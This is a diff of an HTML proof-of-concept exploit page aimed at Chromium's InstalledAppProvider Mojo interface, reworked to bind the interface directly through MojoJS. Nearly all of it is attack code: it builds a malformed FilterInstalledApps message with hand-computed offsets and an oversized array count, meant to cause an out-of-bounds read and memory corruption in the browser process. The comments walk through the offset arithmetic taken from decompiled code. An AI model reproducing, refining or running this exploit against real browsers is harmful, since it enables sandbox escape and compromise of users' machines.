@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>InstalledAppProvider Sandbox Escape PoC</title>
+    <title>InstalledAppProvider OOB – Browser RCE (Direct Bind)</title>
 </head>
 <body>
-    <h1>InstalledAppProvider OOB – Browser RCE</h1>
+    <h1>InstalledAppProvider Sandbox Escape – Direct Bind</h1>
     <pre id="log" style="background:#111;color:#0f0;padding:10px;"></pre>
     <script>
     (async () => {
@@ -14,63 +14,48 @@
         };
 
         try {
-            // Intercept the InstalledAppProvider pipe when it's created
-            const interceptor = new MojoInterfaceInterceptor(
-                'blink.mojom.InstalledAppProvider', 'process');
-            interceptor.oninterfacerequest = (e) => {
-                interceptor.stop();
-                const remote = new blink.mojom.InstalledAppProviderPtr(e.handle);
-                const pipe = remote.ptr.getHandle();
+            // 1. Get the interface provider (requires MojoJSTest)
+            const provider = Mojo.getInterfaceProvider();
+            log('Got interface provider');
 
-                // Build malicious FilterInstalledApps message
-                const payload = new ArrayBuffer(256);
-                const v = new DataView(payload);
+            // 2. Bind InstalledAppProvider directly
+            const handle = Mojo.bindInterface('blink.mojom.InstalledAppProvider', provider);
+            const remote = new blink.mojom.InstalledAppProviderPtr(handle);
+            const pipe = remote.ptr.getHandle();
+            log('Bound to InstalledAppProvider');
 
-                // Mojo message header (16 bytes)
-                v.setUint32(0, 2, true);          // version
-                v.setUint32(4, 0, true);          // flags
-                v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
-                v.setUint32(12, 0, true);         // request_id
+            // 3. Build the malicious FilterInstalledApps message
+            const payload = new ArrayBuffer(256);
+            const v = new DataView(payload);
 
-                // FilterInstalledApps params:
-                // The vulnerable code reads from puVar1, which points to offset 16
-                // puVar1[1] at offset 20 (count)
-                v.setUint32(20, 2, true);          // count >= 2 → trigger offset path
-                // puVar1[8] at offset 24: relative offset (64-bit)
-                // We want to point to offset 0x40 inside the same buffer.
-                // The offset is relative to puVar1+8, so target = puVar1 + 8 + offset
-                // puVar1 = payload+16, so target = 16 + 8 + offset = 24 + offset
-                // To reach 0x40: offset = 0x40 - 24 = 0x1C
-                v.setBigInt64(24, BigInt(0x1C), true);
+            // Mojo message header (16 bytes)
+            v.setUint32(0, 2, true);          // version
+            v.setUint32(4, 0, true);          // flags
+            v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
+            v.setUint32(12, 0, true);         // request_id
 
-                // Fake data at offset 0x40:
-                // The returned pointer = puVar1 + offset + 0x20 (since count>=2 and offset!=0)
-                // = (16) + 0x1C + 0x20 = 0x52? Let's calculate precisely:
-                // puVar1 = message+16. offset = 0x1C.
-                // pointer = puVar1 + offset + 0x20 = message + 16 + 0x1C + 0x20 = message + 0x52
-                // So we need fake data at 0x52. Let's put the array count there.
-                const targetArrayPtr = 0x52;
-                // At that location, we place a fake array length (e.g., 0x1000)
-                v.setUint32(targetArrayPtr, 0x1000, true);  // large array → overflow
+            // Payload layout (starting at offset 16) as expected by FUN_184cc1aa0:
+            // offset 16: uint32 ? (ignored)
+            // offset 20: uint32 count (must be >= 2 to trigger pointer arithmetic)
+            // offset 24: uint64 relative_offset
+            v.setUint32(20, 2, true);         // count = 2
+            // Relative offset = target - (puVar1 + 8) = 0x52 - (16+8) = 0x52 - 0x18 = 0x3A
+            v.setBigInt64(24, BigInt(0x3A), true);
 
-                // Send the raw message (no handles needed)
-                pipe.writeMessage(payload, []);
-                log('Malicious FilterInstalledApps sent!');
-            };
-            interceptor.start();
+            // The computed array pointer will be: puVar1 + offset + 0x20 = 16 + 0x3A + 0x20 = 0x70
+            // At offset 0x70 we place a huge array count (e.g., 0x1000)
+            v.setUint32(0x70, 0x1000, true);   // huge number of apps → out‑of‑bounds read
 
-            // Trigger the renderer to request InstalledAppProvider
-            if (navigator.getInstalledRelatedApps) {
-                navigator.getInstalledRelatedApps().catch(() => {});
-                log('getInstalledRelatedApps called');
-            } else {
-                log('getInstalledRelatedApps not available');
-            }
+            // 4. Send the raw message (no handles)
+            pipe.writeMessage(payload, []);
+            log('Malicious FilterInstalledApps sent!');
+            log('Browser process should crash or exhibit memory corruption now.');
 
-            await new Promise(r => setTimeout(r, 2000));
-            log('Done. If the browser doesn\'t crash, check the browser process.');
+            // Keep the page alive
+            setInterval(() => {}, 10000);
         } catch (e) {
             log('Error: ' + e.message);
+            console.error(e);
         }
     })();
     </script>
